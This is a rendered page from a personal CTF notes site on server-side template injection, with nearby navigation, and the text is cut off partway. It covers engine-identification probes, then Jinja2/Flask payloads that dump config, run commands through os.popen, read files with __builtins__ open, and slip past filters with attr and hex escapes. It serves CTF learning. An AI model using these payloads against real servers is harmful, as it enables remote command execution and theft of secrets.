@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Server-side template injection Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed. A reflected 49 identifies expression evaluation, not a particular engine and not command execution.
+1. First requests Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.
+Raw input Control Interpretation AA{{7*7}}ZZ AA{{7*8}}ZZ AA49ZZ / AA56ZZ: expression evaluation in this delimiter family AA${7*7}ZZ AA${7*8}ZZ FreeMarker, EL or another ${} engine; investigate AA&lt;%= 7*7 %&gt;ZZ AA&lt;%= 7*8 %&gt;ZZ ERB/EJS family; distinguish Ruby from JavaScript AA#{7*7}ZZ AA#{7*8}ZZ Some Ruby/Pug/EL contexts; only meaningful with supporting syntax AA{7*7}ZZ AA{7*8}ZZ Smarty-like arithmetic possible Inspect raw HTTP, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static 49 elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/web-expl/ssti/">
+  <meta property="og:site_name" content="offsec-n0t3">
+  <meta property="og:title" content="SSTI · Identify the Engine First">
+  <meta property="og:description" content="Server-side template injection Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed. A reflected 49 identifies expression evaluation, not a particular engine and not command execution.
+1. First requests Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.
+Raw input Control Interpretation AA{{7*7}}ZZ AA{{7*8}}ZZ AA49ZZ / AA56ZZ: expression evaluation in this delimiter family AA${7*7}ZZ AA${7*8}ZZ FreeMarker, EL or another ${} engine; investigate AA&lt;%= 7*7 %&gt;ZZ AA&lt;%= 7*8 %&gt;ZZ ERB/EJS family; distinguish Ruby from JavaScript AA#{7*7}ZZ AA#{7*8}ZZ Some Ruby/Pug/EL contexts; only meaningful with supporting syntax AA{7*7}ZZ AA{7*8}ZZ Smarty-like arithmetic possible Inspect raw HTTP, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static 49 elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="SSTI · Identify the Engine First">
+  <meta itemprop="description" content="Server-side template injection Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed. A reflected 49 identifies expression evaluation, not a particular engine and not command execution.
+1. First requests Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.
+Raw input Control Interpretation AA{{7*7}}ZZ AA{{7*8}}ZZ AA49ZZ / AA56ZZ: expression evaluation in this delimiter family AA${7*7}ZZ AA${7*8}ZZ FreeMarker, EL or another ${} engine; investigate AA&lt;%= 7*7 %&gt;ZZ AA&lt;%= 7*8 %&gt;ZZ ERB/EJS family; distinguish Ruby from JavaScript AA#{7*7}ZZ AA#{7*8}ZZ Some Ruby/Pug/EL contexts; only meaningful with supporting syntax AA{7*7}ZZ AA{7*8}ZZ Smarty-like arithmetic possible Inspect raw HTTP, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static 49 elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.">
+  <meta itemprop="wordCount" content="1282">
+
+<title>SSTI · Identify the Engine First • offsec-n0t3</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/web-expl/ssti/">
+<link rel="stylesheet" href="/book.min.6a186488aa2758244308597fd301e13ded2a0fdc5af91968a34aa403893bf539.css" integrity="sha256-ahhkiKonWCRDCFl/0wHhPe0qD9xa&#43;Rloo0qkA4k79Tk=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.6641e65073282cb36eef05cedef40c45da2ae0b4450909d47bde09f2d8432c67.js" integrity="sha256-ZkHmUHMoLLNu7wXO3vQMRdoq4LRFCQnUe94J8thDLGc=" crossorigin="anonymous"></script>
+  <meta name="theme-color" content="#252637">
+
+<script defer src="/fieldbook.min.04e65c4f438e6e13ced1f07c11e88ce2991776fff8f8dab5afe6834a7cd40d67.js" integrity="sha256-BOZcT0OObhPO0fB8EeiM4pkXdv/4&#43;Nq1r&#43;aDSnzUDWc="></script>
+<link rel="icon" href="/images/fieldmark.svg" type="image/svg+xml">
+
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<a class="field-brand" href="/" aria-label="offsec-n0t3 home">
+  <span class="brand-sigil" aria-hidden="true">忍</span>
+  <span><strong>offsec<span class="brand-accent">-n0t3</span></strong><small>CTF NOTES / OPEN BOOK</small></span>
+</a>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+<div class="nav-caption">FIELD DIRECTORY <span aria-hidden="true">↙</span></div>
+<a class="directory-home" href="/docs/">⌂ &nbsp; All fieldnotes</a>
+
+
+
+
+
+
+<ul class="field-tree">
+  
+  
+  <li class="field-tree-section" data-collection="web">
+    <details open>
+      <summary><span>Web Exploitation</span><span class="tree-count">32</span></summary>
+      <ul><li><a href="/docs/web-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/web-expl/methodology/" class="" >00 · First 10 Minutes</a></li>
+
+<li><a href="/docs/web-expl/sqli/" class="" >01 · SQLi — Start Here</a></li>
+
+<li><a href="/docs/web-expl/sqli-mysql/" class="" >02 · SQLi — MySQL / MariaDB</a></li>
+
+<li><a href="/docs/web-expl/sqli-postgresql/" class="" >03 · SQLi — PostgreSQL</a></li>
+
+<li><a href="/docs/web-expl/sqli-sqlite/" class="" >04 · SQLi — SQLite</a></li>
+
+<li><a href="/docs/web-expl/sqli-mssql/" class="" >05 · SQLi — SQL Server</a></li>
+
+<li><a href="/docs/web-expl/sqli-oracle/" class="" >06 · SQLi — Oracle</a></li>
+
+<li><a href="/docs/web-expl/sqli-blind/" class="" >07 · SQLi — Blind / Error</a></li>
+
+<li><a href="/docs/web-expl/source-disclosure/" class="" >08 · Source / Backup Leaks</a></li>
+
+<li><a href="/docs/web-expl/ssti/" class="active" aria-current="page">SSTI · Identify the Engine First</a></li>
+
+<li><a href="/docs/web-expl/nosqli/" class="" >NoSQL Injection · Operators &amp; Blind Reads</a></li>
+
+<li><a href="/docs/web-expl/xss/" class="" >XSS · Context Before Payload</a></li>
+
+<li><a href="/docs/web-expl/auth-idor/" class="" >Auth &amp; IDOR · Compare Two Accounts</a></li>
+
+<li><a href="/docs/web-expl/jwt/" class="" >JWT · Claims, Algorithms &amp; Keys</a></li>
+
+<li><a href="/docs/web-expl/oauth/" class="" >OAuth / Account Linking</a></li>
+
+<li><a href="/docs/web-expl/prototype-pollution/" class="" >Prototype Pollution · Source to Gadget</a></li>
+
+<li><a href="/docs/web-expl/graphql/" class="" >GraphQL · Schema to Resolver</a></li>
+
+<li><a href="/docs/web-expl/csrf-cors/" class="" >CSRF &amp; CORS · Send vs Read</a></li>
+
+<li><a href="/docs/web-expl/websockets/" class="" >WebSockets / Live Sessions</a></li>
+
+<li><a href="/docs/web-expl/command-injection/" class="" >Command Injection</a></li>
+
+<li><a href="/docs/web-expl/lfi-traversal/" class="" >Traversal &amp; LFI</a></li>
+
+<li><a href="/docs/web-expl/ssrf/" class="" >SSRF</a></li>
+
+<li><a href="/docs/web-expl/xxe/" class="" >XXE &amp; XML Parsers</a></li>
+
+<li><a href="/docs/web-expl/file-upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/web-expl/deserialization/" class="" >Deserialization</a></li>
+
+<li><a href="/docs/web-expl/business-logic/" class="" >Business Logic &amp; Races</a></li>
+
+<li><a href="/docs/web-expl/http-cache/" class="" >HTTP, Cache &amp; Smuggling</a></li>
+
+<li><a href="/docs/web-expl/php-quirks/" class="" >PHP · Types / Hashes / Parsers</a></li>
+
+<li><a href="/docs/web-expl/ldap-xpath/" class="" >LDAP / XPath Injection</a></li>
+
+<li><a href="/docs/web-expl/open-redirect/" class="" >Open Redirect / URL Parsing</a></li>
+
+<li><a href="/docs/web-expl/encoding-filters/" class="" >Encoding &amp; Filter Bypasses</a></li>
+
+<li><a href="/docs/web-expl/python-snippets/" class="" >Python · Reusable Web Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="network">
+    <details >
+      <summary><span>Network Exploitation</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/network-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/network-expl/packet-triage/" class="" >01 · Packet Triage</a></li>
+
+<li><a href="/docs/network-expl/http-streams/" class="" >02 · HTTP / File Streams</a></li>
+
+<li><a href="/docs/network-expl/dns/" class="" >03 · DNS / Encoded Labels</a></li>
+
+<li><a href="/docs/network-expl/tls-ssh/" class="" >04 · TLS / SSH</a></li>
+
+<li><a href="/docs/network-expl/tcp-udp/" class="" >05 · TCP / UDP Sessions</a></li>
+
+<li><a href="/docs/network-expl/wifi/" class="" >06 · Wi-Fi Capture Analysis</a></li>
+
+<li><a href="/docs/network-expl/can-bus/" class="" >07 · CAN / Cannelloni</a></li>
+
+<li><a href="/docs/network-expl/protocols/" class="" >08 · FTP / Mail / ICMP / SMB</a></li>
+
+<li><a href="/docs/network-expl/python-snippets/" class="" >09 · Python / Ready Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="stego">
+    <details >
+      <summary><span>Steganography</span><span class="tree-count">8</span></summary>
+      <ul><li><a href="/docs/steganograph-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/steganograph-expl/triage/" class="" >First 10 Minutes</a></li>
+
+<li><a href="/docs/steganograph-expl/images-lsb/" class="" >Images: LSB &amp; Bit Planes</a></li>
+
+<li><a href="/docs/steganograph-expl/png-jpeg/" class="" >PNG &amp; JPEG Structure</a></li>
+
+<li><a href="/docs/steganograph-expl/archives-carving/" class="" >Archives &amp; File Carving</a></li>
+
+<li><a href="/docs/steganograph-expl/audio/" class="" >Audio: Samples &amp; Spectrograms</a></li>
+
+<li><a href="/docs/steganograph-expl/pdf-documents/" class="" >PDF &amp; Office Documents</a></li>
+
+<li><a href="/docs/steganograph-expl/text-unicode/" class="" >Text, Whitespace &amp; Unicode</a></li>
+
+<li><a href="/docs/steganograph-expl/python-snippets/" class="" >Offline Python Toolkit</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="reversing">
+    <details >
+      <summary><span>Reverse Engineering</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/reversing-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/reversing-expl/triage/" class="" >Triage · First Five Minutes</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-cheatsheet/" class="" >Ghidra Cheatsheet · From Strings to Check</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-plugins/" class="" >Ghidra Plugins · Built-ins &amp; Offline Extras</a></li>
+
+<li><a href="/docs/reversing-expl/static-analysis/" class="" >Static Analysis · Bytes, Types &amp; Control Flow</a></li>
+
+<li><a href="/docs/reversing-expl/dynamic-debugging/" class="" >Dynamic Debugging · Break, Inspect, Dump</a></li>
+
+<li><a href="/docs/reversing-expl/strings-encodings/" class="" >Strings &amp; Encodings · Preserve the Bytes</a></li>
+
+<li><a href="/docs/reversing-expl/crypto-obfuscation/" class="" >Crypto &amp; Obfuscation · Identify, Model, Verify</a></li>
+
+<li><a href="/docs/reversing-expl/dotnet/" class="" >.NET · dnSpyEx, Resources &amp; IL</a></li>
+
+<li><a href="/docs/reversing-expl/python-snippets/" class="" >Python Snippets · Byte Workbench &amp; Check Models</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="tools">
+    <details >
+      <summary><span>Tools · Visual Cheatsheets</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/tools-cheatsheet/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/tools-cheatsheet/cyberchef-cheatsheet/" class="" >CyberChef · Visual Recipes</a></li>
+
+<li><a href="/docs/tools-cheatsheet/approved-tools-map/" class="" >39 Tools · Technique Map</a></li>
+
+<li><a href="/docs/tools-cheatsheet/python-library/" class="" >Python · Offline Snippet Library</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li><a href="/docs/cli_cheatsheet/" class="">CLI Cheatsheet</a></li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="pico">
+    <details >
+      <summary><span>picoCTF</span><span class="tree-count">4</span></summary>
+      <ul><li><a href="/docs/picoctf/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><details ><summary>Rev</summary><ul><li><a href="/docs/picoctf/rev/">Overview ↗</a></li>
+
+</ul></details></li>
+
+<li><details ><summary>Web</summary><ul><li><a href="/docs/picoctf/web/">Overview ↗</a></li>
+
+<li><a href="/docs/picoctf/web/file_upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/picoctf/web/ip_bypassing/" class="" >Proxy Mnipu</a></li>
+
+<li><a href="/docs/picoctf/web/sqli/" class="" >Sqli</a></li>
+
+<li><a href="/docs/picoctf/web/eval_ssti/" class="" >SSTI</a></li>
+
+</ul></details></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="scripts">
+    <details >
+      <summary><span>Scripts</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/scripts/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/scripts/brute_force_py/" class="" >Brute Force Py</a></li>
+
+<li><a href="/docs/scripts/craft_img_py/" class="" >Craft Img Py</a></li>
+
+<li><a href="/docs/scripts/lro_rlo_fileext/" class="" >Lro Rlo File Ext</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="windows">
+    <details >
+      <summary><span>Windows Rev</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/windows_rev/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/windows_rev/arc4_decrypt/" class="" >Arc4 Decrypt</a></li>
+
+<li><a href="/docs/windows_rev/dmp_hunt4c2/" class="" >Dmp Hunt4c2</a></li>
+
+<li><a href="/docs/windows_rev/x64dbg_cheatsheet/" class="" >X64dbg Cheatsheet</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="approved">
+    <details >
+      <summary><span>AJCBBC Allowed Tools</span><span class="tree-count">39</span></summary>
+      <ul><li><a href="/docs/ajcbbc_allow_tools/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/ajcbbc_allow_tools/cyberchef/" class="" >CyberChef</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wireshark/" class="" >Wireshark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdf_viewer/" class="" >PDF Viewer</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openvpn_client/" class="" >OpenVPN Client</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/google_chrome/" class="" >Google Chrome</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wsl/" class="" >Windows Subsystem for Linux (WSL)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/python3/" class="" >Python 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/uv/" class="" >uv</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/gdb/" class="" >gdb</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/objdump/" class="" >objdump</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/strings/" class="" >strings</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zsteg/" class="" >zsteg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/binwalk/" class="" >binwalk</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/exiftool/" class="" >ExifTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdftotext/" class="" >pdftotext (Poppler utils)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/can_utils/" class="" >can-utils</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/cannelloni/" class="" >cannelloni</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zeek/" class="" >Zeek</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zbar/" class="" >ZBar</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/burp_suite_community/" class="" >Burp Suite Community Edition</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/jq/" class="" >jq</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/ghidra/" class="" >Ghidra</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/sleuth_kit/" class="" >The Sleuth Kit</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssl/" class="" >OpenSSL</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xz/" class="" >xz</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/qpdf/" class="" >qpdf</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/llvm_mc/" class="" >llvm-mc (LLVM tools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xxd/" class="" >xxd</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/fsck_fat/" class="" >fsck.fat (dosfstools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/rsactftool/" class="" >RsaCtfTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/volatility3/" class="" >Volatility 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssh_session_key_recovery/" class="" >OpenSSH-Session-Key-Recovery</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/x64dbg/" class="" >x64dbg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/autopsy/" class="" >Autopsy</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/hxd/" class="" >HxD</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/tshark/" class="" >TShark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/notepad_plus_plus/" class="" >Notepad&#43;&#43;</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/dnspyex/" class="" >dnSpyEx (dnSpy)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/eric_zimmerman_tools/" class="" >Eric Zimmerman&#39;s Tools</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+</ul>
+
+
+
+
+
+
+
+<div class="nav-footer"><span class="status-dot" aria-hidden="true"></span> OFFLINE / PERSONAL NOTES<br><span>Payloads · methods · worked examples</span></div>
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>SSTI · Identify the Engine First</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-first-requests">1. First requests</a></li>
+    <li><a href="#2-identify-with-a-second-independent-signal">2. Identify with a second independent signal</a></li>
+    <li><a href="#3-jinja2--flask-inspect-before-executing">3. Jinja2 / Flask: inspect before executing</a>
+      <ul>
+        <li><a href="#attribute-syntax-and-narrow-string-filters">Attribute syntax and narrow string filters</a></li>
+        <li><a href="#object-graph-route-when-helpers-are-absent">Object graph route when helpers are absent</a></li>
+        <li><a href="#blind-or-hidden-result">Blind or hidden result</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-twig--php">4. Twig / PHP</a></li>
+    <li><a href="#5-freemarker--java">5. FreeMarker / Java</a></li>
+    <li><a href="#6-erb--ruby">6. ERB / Ruby</a></li>
+    <li><a href="#7-ejs--node">7. EJS / Node</a></li>
+    <li><a href="#8-smarty">8. Smarty</a></li>
+    <li><a href="#9-if-the-payload-fails">9. If the payload fails</a></li>
+    <li><a href="#tool-workflow">Tool workflow</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      <div id="field-content" tabindex="-1"></div>
+
+<div class="page-topline" data-collection="web"><nav aria-label="Breadcrumb"><a href="/docs/">NOTEBOOK</a><span>/</span><a href="/docs/web-expl/">Web Exploitation</a></nav><span>7 MIN READ</span></div>
+
+
+
+      
+  <article class="markdown book-article"><h1 id="server-side-template-injection">Server-side template injection<a class="anchor" href="#server-side-template-injection"></a></h1>
+<p><strong>Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed.</strong> A reflected <code>49</code> identifies expression evaluation, not a particular engine and not command execution.</p>
+<h2 id="1-first-requests">1. First requests<a class="anchor" href="#1-first-requests"></a></h2>
+<p>Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Raw input</th>
+          <th>Control</th>
+          <th>Interpretation</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>AA{{7*7}}ZZ</code></td>
+          <td><code>AA{{7*8}}ZZ</code></td>
+          <td><code>AA49ZZ</code> / <code>AA56ZZ</code>: expression evaluation in this delimiter family</td>
+      </tr>
+      <tr>
+          <td><code>AA${7*7}ZZ</code></td>
+          <td><code>AA${7*8}ZZ</code></td>
+          <td>FreeMarker, EL or another <code>${}</code> engine; investigate</td>
+      </tr>
+      <tr>
+          <td><code>AA&lt;%= 7*7 %&gt;ZZ</code></td>
+          <td><code>AA&lt;%= 7*8 %&gt;ZZ</code></td>
+          <td>ERB/EJS family; distinguish Ruby from JavaScript</td>
+      </tr>
+      <tr>
+          <td><code>AA#{7*7}ZZ</code></td>
+          <td><code>AA#{7*8}ZZ</code></td>
+          <td>Some Ruby/Pug/EL contexts; only meaningful with supporting syntax</td>
+      </tr>
+      <tr>
+          <td><code>AA{7*7}ZZ</code></td>
+          <td><code>AA{7*8}ZZ</code></td>
+          <td>Smarty-like arithmetic possible</td>
+      </tr>
+  </tbody>
+</table>
+<p>Inspect <strong>raw HTTP</strong>, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static <code>49</code> elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#88c0d0">POST</span> <span style="color:#8fbcbb">/preview</span> <span style="color:#81a1c1;font-weight:bold">HTTP</span><span style="color:#81a1c1">/</span><span style="color:#b48ead">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#81a1c1">:</span> ctf.invalid
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#81a1c1">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name=AA%7B%7B7*7%7D%7DZZ</span></span></code></pre></div><p>Inside a decoded parameter editor, paste <code>AA{{7*7}}ZZ</code>. In JSON, use <code>{&quot;name&quot;:&quot;AA{{7*7}}ZZ&quot;}</code>. Avoid applying URL encoding to the entire JSON body.</p>
+<h2 id="2-identify-with-a-second-independent-signal">2. Identify with a second independent signal<a class="anchor" href="#2-identify-with-a-second-independent-signal"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Family</th>
+          <th>Additional test</th>
+          <th>Useful evidence / caveat</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Jinja2</td>
+          <td><code>{{7*'7'}}</code> → seven 7s; `{{&lsquo;ab&rsquo;</td>
+          <td>upper}}` → AB</td>
+      </tr>
+      <tr>
+          <td>Twig</td>
+          <td><code>{{7*'7'}}</code> → 49 in compatible numeric coercion</td>
+          <td><code>{{_self}}</code>, <code>{{constant('PHP_VERSION')}}</code> where allowed; PHP/Twig error names</td>
+      </tr>
+      <tr>
+          <td>FreeMarker</td>
+          <td><code>${&quot;ab&quot;?upper_case}</code> → AB</td>
+          <td><code>&lt;#assign x=7&gt;${x*7}</code>; <code>.version</code> special variable</td>
+      </tr>
+      <tr>
+          <td>ERB</td>
+          <td><code>&lt;%= 'ab'.upcase %&gt;</code> → AB</td>
+          <td>Ruby class names; <code>&lt;%= RUBY_VERSION %&gt;</code></td>
+      </tr>
+      <tr>
+          <td>EJS</td>
+          <td><code>&lt;%= 'ab'.toUpperCase() %&gt;</code> → AB</td>
+          <td>JS <code>ReferenceError</code>, <code>typeof process</code>; Ruby <code>.upcase</code> fails</td>
+      </tr>
+      <tr>
+          <td>Smarty</td>
+          <td><code>{$smarty.version}</code></td>
+          <td>Version exposure may be restricted; Smarty compiler errors</td>
+      </tr>
+      <tr>
+          <td>Nunjucks</td>
+          <td><code>{{7*7}}</code>, JS-oriented exposed objects</td>
+          <td>Jinja payloads using Python globals do not transfer</td>
+      </tr>
+      <tr>
+          <td>Handlebars</td>
+          <td><code>{{#if true}}YES{{/if}}</code></td>
+          <td>Arithmetic inside double braces is not a general Handlebars expression</td>
+      </tr>
+  </tbody>
+</table>
+<p>Do not label <code>${7*7}</code> “Java RCE” or assume Twig because Jinja multiplication behaves differently. Capture an engine-specific object, error or source dependency. Undefined variables often render empty.</p>
+<h2 id="3-jinja2--flask-inspect-before-executing">3. Jinja2 / Flask: inspect before executing<a class="anchor" href="#3-jinja2--flask-inspect-before-executing"></a></h2>
+<p>Start with context objects; these can expose the answer without shell access.</p>
+<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{{ self }}
+{{ config }}
+{{ request }}
+{{ request.application }}
+{{ session }}
+{{ config.items() }}
+{{ request.environ }}
+{{ url_for.__globals__ }}</code></pre><p><code>config</code>, <code>request</code>, <code>session</code> and <code>url_for</code> are <strong>Flask context conveniences</strong>, not guaranteed Jinja globals. Request-dependent objects can be unavailable in offline render jobs. <code>config</code> can include secrets; it does not necessarily include the flag.</p>
+<p>For a normal, unsandboxed environment exposing standard Jinja helpers:</p>
+<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{{ cycler.__init__.__globals__ }}
+{{ cycler.__init__.__globals__.os.getcwd() }}
+{{ cycler.__init__.__globals__.os.listdir(&#39;/&#39;) }}
+{{ cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() }}
+{{ cycler.__init__.__globals__.os.popen(&#39;cat /flag.txt&#39;).read() }}
+{{ joiner.__init__.__globals__.os.popen(&#39;id&#39;).read() }}
+{{ namespace.__init__.__globals__.os.popen(&#39;id&#39;).read() }}</code></pre><p>These depend on helper implementation/global contents and unrestricted internal attribute access. <code>SecurityError: ... unsafe</code> is evidence of sandbox restrictions; these are <strong>not modern sandbox escapes</strong>. Read available objects and app source rather than repeatedly sending the same private-attribute chain.</p>
+<p>If a reachable function exposes Python builtins, examine whether <code>__builtins__</code> is a mapping or module. The following mapping form is conditional:</p>
+<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{{ url_for.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/flag.txt&#39;).read() }}
+{{ url_for.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).listdir(&#39;/&#39;) }}</code></pre><h3 id="attribute-syntax-and-narrow-string-filters">Attribute syntax and narrow string filters<a class="anchor" href="#attribute-syntax-and-narrow-string-filters"></a></h3>
+<p>Where equivalent attribute access is allowed:</p>
+<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{{ cycler[&#39;__init__&#39;][&#39;__globals__&#39;][&#39;os&#39;].popen(&#39;id&#39;).read() }}
+{{ (cycler|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;))[&#39;os&#39;].popen(&#39;id&#39;).read() }}
+{{ cycler|attr(&#39;\x5f\x5finit\x5f\x5f&#39;) }}
